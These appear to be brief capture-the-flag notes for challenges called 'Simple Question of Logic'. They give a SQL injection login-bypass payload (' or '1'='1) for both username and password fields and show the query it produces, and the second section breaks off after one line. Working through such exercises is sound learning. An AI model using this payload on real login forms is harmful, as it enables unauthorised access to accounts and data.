## Simple Question of Logic 1
- use this in both fields (cf. [inject](https://d00mfist.gitbooks.io/ctf/content/sql-injections.html))
```erlang
_' or '1'='1
_' or '1'='1
```
- to trick sql
```erlang
$query = "select * from users where user = '_' OR '1'='1' and pw = '_' OR '1'='1'";
```
ps. standard first test: `' or '1'='1`
## Simple Question of Logic 2
use this in both fields
